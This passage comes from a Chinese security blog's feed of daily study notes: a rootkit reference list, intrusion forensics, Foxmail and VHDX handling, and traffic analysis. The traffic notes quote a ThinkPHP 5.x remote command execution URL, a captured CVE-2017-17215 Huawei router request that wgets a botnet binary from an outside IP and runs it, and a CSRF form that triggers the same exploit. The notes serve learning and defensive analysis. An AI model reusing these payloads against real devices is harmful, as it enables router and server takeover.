src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/cfda8903-3152-4694-b40e-17b79caca27d.jpg" alt="cfda8903-3152-4694-b40e-17b79caca27d.jpg"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>攻与防无非看谁更底层，看谁能修改谁的东西，而各种技术的实现上基本都是针对某个点的各种<code>hook</code>，<a href="http://www.voidcn.com/article/p-sfjritoa-bcx.html">LINUX HOOK技术</a>是一个比较好的入门文章，各种技术都介绍的比较全面，后续将填一下<code>hook</code>技术的坑。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.brickgao.com/2016/08/07/simple-rootkit/">通过内核模块实现隐藏信息的 Rootkit</a></li><li><a href="http://netinfo-security.org/article/2016/1671-1122-0-4-1.html#close">基于LKM系统调用劫持的恶意软件行为监控技术研究</a></li><li><a href="http://blog.51cto.com/staronmytop/1119475">Linux下的RootKit简单介绍与分析</a></li><li><a href="https://pengcc.iteye.com/blog/910449">Linux内核模块与应用程序的区别</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html">系统调用表</a></li><li><a href="https://blog.csdn.net/u012301943/article/details/25830229">linux–函数劫持–基于LD_PRELOAD</a></li><li><a href="https://www.cnblogs.com/codingMozart/p/4829367.html">linux dll劫持</a></li><li><a href="https://www.linuxidc.com/Linux/2017-12/149841.htm">动态连接的诀窍：使用 LD_PRELOAD 去欺骗、注入特性和研究程序</a></li><li><a href="https://github.com/hschen0712/process-hiding">linux下实现进程隐藏</a></li><li><a href="https://hk.saowen.com/a/660685647e44a4d6f7e5ee0bf56e2faa5191b2d562516bd2ea979a3de9ae064a">LD_PRELOAD的偷樑換柱之能</a></li><li><a href="https://hk.saowen.com/a/a1af7350165c37f0cbef19116c2f0ea257a9f55f94fe420cd54f2d1140f42034">Linux動態鏈接庫預加載型rootkit的檢測技術</a></li><li><a href="http://9bie.org/index.php/archives/354/">新坑预定：linux下的进程&#x2F;文件隐藏</a></li><li><a href="https://blog.csdn.net/zhuyi2654715/article/details/7605051">Linux下DIR，dirent,stat等结构体详解</a></li><li><a href="https://my.oschina.net/jxcdwangtao/blog/828645">劫持系统函数Demo</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-dynamic-libraries/index.html">Linux 动态库剖析</a></li><li><a href="https://www.cnblogs.com/coolalan/p/3978215.html">增加-进程隐藏功能的系统调用</a></li><li><a href="http://www.carch.ac.cn/uploadfile/2017/0824/20170824052844948.pdf">Linux内核级Rootkit检测研究 - 计算机体系结构国家重点实验室</a></li><li>[<a href="http://bbs.javaee.cc/post/250772_1_1.html">杂七杂八] rootkit技术</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-vfs/index.html">从文件 I&#x2F;O 看 Linux 的虚拟文件系统</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-4731.html">Linux下基于内存分析的Rootkit检测方法</a></li><li><a href="http://www.voidcn.com/article/p-nzamfimp-wk.html">proc文件系统_每进程信息形成原理、目录遍历方式、位图查找</a></li><li><a href="https://blog.csdn.net/dog250/article/details/84201114">Linux内核如何替换内核函数并调用原始函数</a></li><li><a href="https://blog.csdn.net/gatieme/article/details/51383272">Linux进程描述符task_struct结构体详解–Linux进程的管理与调度（一</a></li><li><a href="https://blog.csdn.net/billpig/article/details/6038330">linux 隐藏进程 - crux实现</a></li><li><a href="https://www.ibm.com/developerworks/library/l-kprobes/index.html">Kernel debugging with Kprobes</a></li><li><a href="http://www.voidcn.com/article/p-sfjritoa-bcx.html">LINUX HOOK技术</a></li><li><a href="https://blog.csdn.net/wangkai_123456/article/details/22524875">函数指针和指针函数</a></li><li><a href="https://insswer.iteye.com/blog/1040408">嵌入式C语言笔记03——函数指针，内存陷阱，堆栈</a></li><li><a href="http://docs.linuxtone.org/ebooks/C&CPP/c/ch29s03.html">VFS文件系统</a></li><li><a href="https://hyshucom.iteye.com/blog/1681448">Linux 2.6 劫持系统调用 隐藏进程</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/3910696.html">Rootkit Hacking Technology &amp;&amp; Defence Strategy Research</a></li><li><a href="https://arkingc.github.io/2017/08/18/2017-08-18-linux-code-vfs/#VFS%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84">VFS中的基本结构</a></li><li><a href="https://www.cnblogs.com/embedded-linux/p/5663176.html">linux虚拟文件系统vfs</a></li><li><a href="http://tinylab.org/linux-kernel-uapi/">Linux Kernel UAPI</a></li><li><a href="https://blog.csdn.net/wenqiang1208/article/details/55809008">Linux下的FILE结构体</a></li><li><a href="http://landcareweb.com/questions/5663/linux-kernel-xi-tong-diao-yong-gua-gou-shi-li">Linux Kernel：系统调用挂钩示例</a></li><li><a href="https://www.freebuf.com/articles/system/54263.html">Linux Rootkit系列一：LKM的基础编写及隐藏</a></li><li><a href="http://blog.chinaunix.net/uid-20321537-id-1966892.html">linux 内核库函数</a></li><li><a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit.html">Linux Rootkit 研究</a></li><li><a href="http://www.doc88.com/p-2072466235621.html">LInux中实现进程隐藏的一种新方法</a></li><li><a href="https://www.cnblogs.com/sky-heaven/p/5192778.html">获得内核函数地址的四种方法</a></li><li><a href="https://www.cnblogs.com/bittorrent/p/3804141.html">获取Linux内核未导出符号的几种方式</a></li><li><a href="https://linux.cn/article-7411-1.html">Linux 内核自防护项目 KSPP</a></li><li><a href="https://zhuanlan.zhihu.com/p/51645782">如何增强Linux内核中的访问控制安全</a></li><li><a href="http://blog.51cto.com/laokaddk/421860">高级Linux Kernel Inline Hook技术分析与实现</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-kprobes.html">使用 Kprobes 调试内核</a></li><li><a href="http://b8807053.pixnet.net/blog/post/340096445-[%E8%BD%89]oops%E4%B8%AD%E7%9A%84error-code%E8%A7%A3%E9%87%8B">Oops中的error code解釋</a></li><li><a href="http://www.it610.com/article/4559233.htm">Linux内核通过inline hook实现隐藏进程</a></li><li><a href="https://blog.csdn.net/andy205214/article/details/77148573">Linux内核调试技术——kprobe使用与实现</a></li><li><a href="http://blog.chinaunix.net/uid-23769728-id-3198044.html">浅析kprobe调试方法的背后原理</a></li><li><a href="http://bbs.chinaunix.net/thread-1946913-1-1.html">Linux下实现劫持系统调用的总结</a></li><li><a href="https://blog.csdn.net/jieqiong1/article/details/54379265">系统接口——系统调用的实现</a></li><li><a href="https://www.cnblogs.com/wuchanming/p/4490622.html">系统调用</a></li><li><a href="https://www.open-open.com/pdf/bb576d1c368c43fb9c3c0dc36e37fb7e.html">由实模式到start_kernel</a></li><li><a href="http://blog.chinaunix.net/uid-27717694-id-3942170.html">linux下X86架构IDT解析</a></li><li><a href="https://www.cnblogs.com/lq0729/articles/2796448.html">CALL指令有多少种写法</a></li><li>[<a href="https://cloud.tencent.com/developer/article/1087370">linux][retpoline] retpoline技术分析</a></li><li><a href="http://blog.sina.com.cn/s/blog_6badf70001010qlf.html">Intel系列CPU指令速查手册</a></li><li><a href="https://blog.csdn.net/wdxz6547/article/details/50993837">内核分析-第五周</a></li><li><a href="https://blog.csdn.net/sdulibh/article/details/82852900">深入理解 x86&#x2F;x64 的中断体系–IVT VS IDT</a></li><li><a href="https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/#%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E7%A7%8D%E7%B1%BB">中断的定义与种类</a></li><li><a href="http://www.cppblog.com/converse/archive/2009/04/29/81496.html">linux内核V2.6.11学习笔记(5)–异常处理</a></li><li><a href="https://blog.csdn.net/beswkwangbo/article/details/8145190">实例一——为自己的操作系统中加入中断(中断机制的实现)</a></li><li><a href="https://www.jianshu.com/p/a81f0822190b">利用gdb python extention学习内核</a></li><li><a href="https://blog.csdn.net/skyflying2012/article/details/7850674">细说内核中断机制</a></li><li><a href="https://www.binss.me/blog/the-analysis-of-linux-system-call/">Linux系统调用过程分析</a></li><li><a href="http://www.kbase101.com/question/56665.html">在x86_64 linux中进行系统调用是否仍会产生中断？</a></li><li><a href="https://stackoverflow.com/questions/15168822/intel-x86-vs-x64-system-call">Intel x86 vs x64 system call</a></li><li><a href="http://www.cppblog.com/hex108/archive/2010/11/22/134313.html">linux下的vdso与vsyscall</a></li><li><a href="http://lastweek.io/lego/syscall/compat/">Compat SYSCALL in Lego</a></li><li><a href="https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code">What happens if you use the 32-bit int 0x80 Linux ABI in 64-bit code?</a></li><li><a href="https://stackoverflow.com/questions/344829/what-is-kernel-vsyscall">what-is-kernel-vsyscall</a></li><li><a href="https://www.binss.me/blog/interrupt-and-exception/">中断和异常</a></li><li><a href="https://blog.csdn.net/hxmhyp/article/details/22699669">Linux系统调用之SYSCALL_DEFINE</a></li><li><a href="https://blog.csdn.net/hxmhyp/article/details/22619729">Linux CVE-2009-0029 漏洞解析</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/4649366.html">UEFI BIOS Rootkit Analysis</a></li><li><a href="https://www.cnblogs.com/zfyouxi/p/4263622.html">进程的管理与调度</a></li><li><a href="https://www.cnblogs.com/lknlfy/archive/2012/07/09/2582397.html">Linux内核中的双向循环链表学习</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/3870974.html">Linux Rootkit Learning</a></li><li><a href="https://edsionte.com/techblog/archives/1841">遍历进程链表</a></li><li><a href="https://www.cnblogs.com/riky/archive/2006/12/28/606242.html">linux 内核分析之list_head</a></li><li><a href="https://r00tk1ts.github.io/2017/08/22/Linux%E8%BF%9B%E7%A8%8B%E6%A6%82%E8%BF%B0/">Linux内核学习——Linux进程概述</a></li><li><a href="https://www.linuxidc.com/wap.aspx?nid=78001&p=4&cid=6&sp=56">哈希链表的遍历</a></li><li><a href="https://blog.csdn.net/YuZhiHui_No1/article/details/38357899">linux内核之哈希链表解析</a></li><li><a href="http://www.voidcn.com/article/p-oyhzfnjz-sq.html">哈希表在进程管理中的应用</a></li><li><a href="https://blog.csdn.net/jianghuan555/article/details/38037877">linux 进程管理—–pid哈希链表</a></li><li><a href="https://stackoverflow.com/questions/27862132/inserting-a-pid-in-the-linux-hash-table">Inserting a PID in the Linux Hash-Table</a></li><li><a href="https://blog.csdn.net/viewsky11/article/details/53123651">Linux kernel Hash list</a></li><li><a href="https://github.com/gatieme/LDD-LinuxDeviceDrivers/tree/master/study/kernel/01-process/01-task/03-pid">Linux进程ID号–Linux进程的管理与调度（三）</a></li><li><a href="http://wiki.dreamrunner.org/public_html/Embedded-System/kernel/list-and-hlist.html">list-and-hlist</a></li><li><a href="http://blog.chinaunix.net/uid-27033491-id-3291864.html">pid到struct pid内核函数详解</a></li><li><a href="http://blog.tiaozaoj.com/index.php/archives/194/">linux内核根据pid，列出家族信息中的程序名和PID号</a></li><li><a href="https://carecraft.github.io/basictheory/2017/03/linux-pid-manage/">linux内核PID管理</a></li><li><a href="https://www.blackhat.com/presentations/win-usa-04/bh-win-04-butler.pdf">bh-win-04-butler</a></li><li><a href="https://github.com/novelinux/linux-4.x.y/tree/master/kernel/pid.c">novelinux</a></li><li><a href="http://blog.udn.com/2768717191/25366271">linux的container_of</a></li><li><a href="https://juejin.im/post/59f6e0a86fb9a045167c7831">深入理解 Linux 的 RCU 机制</a></li><li><a href="https://blog.csdn.net/weijitao/article/details/79918013">通过pid查找进程task_struct结构体</a></li><li><a href="http://blog.chinaunix.net/uid-27033491-id-3291637.html">linux内核哈希查找（1）</a></li><li><a href="https://www.cnblogs.com/ck1020/p/5954135.html">Linux内核中namespace之PID namespace</a></li><li><a href="https://www.cnblogs.com/hazir/p/linux_kernel_pid.html">Linux 内核进程管理之进程ID</a></li><li><a href="https://blog.csdn.net/bysun2013/article/details/14053937">Linux pid_hash散列表</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习大佬的笔记&lt;/p&gt;</summary>
    
    
    
    <category term="学习大佬" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E5%A4%A7%E4%BD%AC/"/>
    
    
    <category term="进程隐藏" scheme="http://example.com/tags/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>3-19</title>
    <link href="http://example.com/2020/03/19/3.19/"/>
    <id>http://example.com/2020/03/19/3.19/</id>
    <published>2020-03-19T01:47:57.000Z</published>
    <updated>2020-03-19T09:50:07.686Z</updated>
    
    <content type="html"><![CDATA[<p>学习转换邮件</p><span id="more"></span><h1 id="取证过程"><a href="#取证过程" class="headerlink" title="取证过程"></a>取证过程</h1><p><strong>只做记录，没有具体整理，大致思路就是这样的</strong></p><p>首先第一步拿到的资料有vhdx、img镜像以及内存RAW</p><p>由于镜像太大不考虑转换虚拟机格式进行分析(StarWind V2V转换工具)</p><p>所以用DiskGenius、UFS Explorer分析</p><p>已知该机器上有多个下载者，分析其入侵方式和过程</p><p>通过排查浏览器下载、用户下载等目录在下载者进入的时间段的文件</p><p>这一步没有找到相关的可疑文件</p><p>然后从日志入手，导入导出</p><p>日志路径位于<code>C:\Windows\System32\winevt\Logs</code></p><p>查看powershell日志，只有有powershell操作就会记录日志</p><p>查找日志前后文件，发现可疑邮件收取、可疑服务开启</p><p>用UFS Explorer打开后选择磁盘右键<code>Save object list to file</code>，导出文件时间表</p><p>foxmail邮件导入导出</p><p>可疑附件，虚拟机逆向分析</p><p>process monitor用过滤器过滤关键字<code>powershell.exe</code></p><p>打开附件并开启宏</p><p>监听并找到powershell对应执行命令，复制到notepad++</p><p>发现命令为base64编码，利用插件解码后为unicode编码</p><p>复制在notepad++重新粘贴，去除空格即可看到原始命令</p><p>命令中包含可疑URL，利用对应域名查找威胁情报</p><p>分析攻击过程，关联可疑服务</p><h1 id="导入邮件目录"><a href="#导入邮件目录" class="headerlink" title="导入邮件目录"></a>导入邮件目录</h1><p>参考链接</p><blockquote><p><a href="http://www.dnpz.net/diannaozhishi/1635.html">http://www.dnpz.net/diannaozhishi/1635.html</a></p></blockquote><p><strong>Foxmail如何导入原来的邮件</strong>的操作方法：（适用于foxmail 7.1及以上版本）</p><p>   一、在转移Foxmail旧数据到新的电脑上之前，我们需要先保存旧的数据，具体文件夹选择：D&#x2F;Programe Files&#x2F;Foxmail 7.2&#x2F;Storage，我们将里边的个人邮箱文件夹（如下图）复制出来到移动设备上就可以了。</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G12250509.png" alt="foxmail如何导入原来的邮件"></p><p>   二、到达另一个电脑的位置之后，我们安装7.1版本以上的Foxmail软件，启动之后，由于没有个人邮箱的话，无法启动，所以我们先用一个个人邮箱账户进行添加，这样就能进入Foxmail的主界面了。</p><p>   三、这时，我们开始正式进行foxmail旧数据的导入工作了。</p><p>   第一步，将之前保存的个人邮箱文件夹，复制到相对应Foxmail安装位置，也就是之前提到的D&#x2F;Programe Files&#x2F;Foxmail 7.2&#x2F;Storage，复制进去就可以啦。如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G12312318.png" alt="foxmail如何导入原来的邮件"></p><p>   第二步，我们还需要进行一些数据文件的更改，同样地进入Foxmail软件安装位置的根目录，我们找到名称为FMStorage，打开它就可以，小编就是用txt格式打开的。如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G1232S03.png" alt="2015-03-17_112512.png"></p><p>   第三步，按照已有的格式，将你的个人邮箱添加进去，记住格式一定要一样，然后点击保存就可以啦，如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G124414I.png" alt="foxmail如何导入原来的数据"></p><p>   第四步，以上工作完成以后，我们再重新启动Foxmail，这是你就会发现已经将旧数据导入进来了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习转换邮件&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="取证分析" scheme="http://example.com/tags/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/"/>
    
    <category term="邮件" scheme="http://example.com/tags/%E9%82%AE%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>3-18</title>
    <link href="http://example.com/2020/03/18/3.18/"/>
    <id>http://example.com/2020/03/18/3.18/</id>
    <published>2020-03-18T04:15:57.000Z</published>
    <updated>2020-03-18T10:08:39.919Z</updated>
    
    <content type="html"><![CDATA[<p>学习磁盘取证，木马溯源</p><span id="more"></span><h1 id="Windows-XML事件日志（EVTX）格式"><a href="#Windows-XML事件日志（EVTX）格式" class="headerlink" title="Windows XML事件日志（EVTX）格式"></a>Windows XML事件日志（EVTX）格式</h1><p>参考链接</p><blockquote><p>[<a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#2-file-header]">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#2-file-header]</a>(<a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows">https://github.com/libyal/libevtx/blob/master/documentation/Windows</a> XML Event Log (EVTX).asciidoc#2-file-header)</p></blockquote><p>Windows Defender的病毒扫描文件（Defender它是系统自带的病毒检测工具），隔离文件手动删除<br>扫描记录和病毒库备份：C\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Quick<br>C\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Resour</p><p>activex控件目录：WINDOWS\Downloaded Program Files </p><p>dwusplay.exe的描述为“ <strong>InstallShield更新服务安装程序播放器</strong> ”</p><p>dwusplay.exe通常位于“ C：\ Windows \ Downloaded Program Files \”文件夹中。</p><p>日志Microsoft-Windows-Bits-Client中记录Bits传送作业，可以看到下载文件操作</p><p>渗透要积累</p><blockquote><p><a href="https://www.cnblogs.com/hookjoy/category/556211.html">https://www.cnblogs.com/hookjoy/category/556211.html</a></p></blockquote><p>应急响应-先知社区</p><blockquote><p><a href="https://xz.aliyun.com/t/2524#toc-33">https://xz.aliyun.com/t/2524#toc-33</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习磁盘取证，木马溯源&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="windows" scheme="http://example.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>3-17</title>
    <link href="http://example.com/2020/03/17/3.17/"/>
    <id>http://example.com/2020/03/17/3.17/</id>
    <published>2020-03-17T02:15:57.000Z</published>
    <updated>2020-03-18T02:57:40.006Z</updated>
    
    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="ThinkPHP-5-x远程命令执行漏洞"><a href="#ThinkPHP-5-x远程命令执行漏洞" class="headerlink" title="ThinkPHP 5.x远程命令执行漏洞"></a>ThinkPHP 5.x远程命令执行漏洞</h1><p>流量中发现这样一段payload，发现是远程命令执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9096/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>原文链接</p><blockquote><p><a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p></blockquote><h1 id="vm打开vhdx镜像"><a href="#vm打开vhdx镜像" class="headerlink" title="vm打开vhdx镜像"></a>vm打开vhdx镜像</h1><p>StarWind V2V Converter</p><p>安装将vhdx转换vmdk即可</p><p>vhdx与vhd文件</p><p>vhdx是vhd格式的升级，与旧的 VHD 格式相比，VHDX 具有更大的存储容量</p><h2 id="附加VHD报错"><a href="#附加VHD报错" class="headerlink" title="附加VHD报错"></a>附加VHD报错</h2><p>在打开VHDX文件时，出了点意外情况，源文件可以直接挂载到硬盘，拷贝之后打开不。。。</p><p>计算机右键管理–操作–附加VHD，报错<code>由于虚拟磁盘系统限制，无法完成请求的操作。虚拟硬盘文件必须是未压缩和未加密的文件，并且不能是稀疏文件。</code></p><p>解决方法：VHD文件右键–高级–取消压缩内容以便节省磁盘空间</p><p>c盘文件夹</p><p>(Msocache)office本地安装源</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="远程执行漏洞" scheme="http://example.com/tags/%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="虚拟机转换格式" scheme="http://example.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AC%E6%8D%A2%E6%A0%BC%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>3-16</title>
    <link href="http://example.com/2020/03/16/3.16/"/>
    <id>http://example.com/2020/03/16/3.16/</id>
    <published>2020-03-16T08:15:57.000Z</published>
    <updated>2020-03-16T10:30:06.703Z</updated>
    
    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="CVE-2017-17215"><a href="#CVE-2017-17215" class="headerlink" title="CVE-2017-17215"></a>CVE-2017-17215</h1><blockquote><p><a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/">https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/</a></p></blockquote><p>在分析流量的时候，发现威胁告警中有一个<strong>华为远程命令执行漏洞</strong>，随即找到其相关特征</p><p>完整原流量数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Content-Length: 430</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g 2.56.8.156 -l /tmp/vt -r /bins/DEMONS.mips; /bin/busybox chmod 777 /tmp/vt;/tmp/vt huawei.mips;&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前网络流传的PoC大部分为在HTTP的请求头里构造一个适用于基础认证的字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br></pre></td></tr></table></figure><p>用表单来构造一个XML的请求包了。为了不让浏览器对请求体编码，需要指定表单的enctype为text&#x2F;plain，利用input标签的name和value两个属性的值可以构造出我们想要的内容。<br>最终构造的CSRF攻击payload样例如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&#x27;document.forms[0].submit()&#x27;&gt;</span><br><span class="line">  &lt;form method=&#x27;POST&#x27; enctype=&#x27;text/plain&#x27; action=&quot;http://dslf-config:admin@192.168.1.1:37215/ctrlt/DeviceUpgrade_1&quot;&gt;</span><br><span class="line">    &lt;input name=&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;a&#x27; value=&#x27;1;$(/bin/busybox wget -g 192.168.1.2 -l /tmp/.f -r /b);&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;&#x27;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>攻击者只要诱使用户访问包含上述代码的页面，存在漏洞的路由器就会远程下载一个bash脚本并以root的身份执行。</p><h1 id="v2rayN-vmess每日更新"><a href="#v2rayN-vmess每日更新" class="headerlink" title="v2rayN(vmess每日更新)"></a>v2rayN(vmess每日更新)</h1><blockquote><p><a href="https://jichangdaquan.com/node/429.html">https://jichangdaquan.com/node/429.html</a></p></blockquote><h1 id="CVE每日更新"><a href="#CVE每日更新" class="headerlink" title="CVE每日更新"></a>CVE每日更新</h1><p>链接中包含每日获取cve发送到邮箱的脚本</p><blockquote><p><a href="https://www.freebuf.com/articles/es/228571.html">https://www.freebuf.com/articles/es/228571.html</a></p></blockquote><p>每日cve更新的链接，如下：</p><blockquote><p><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
    <category term="流量分析" scheme="http://example.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
</feed>
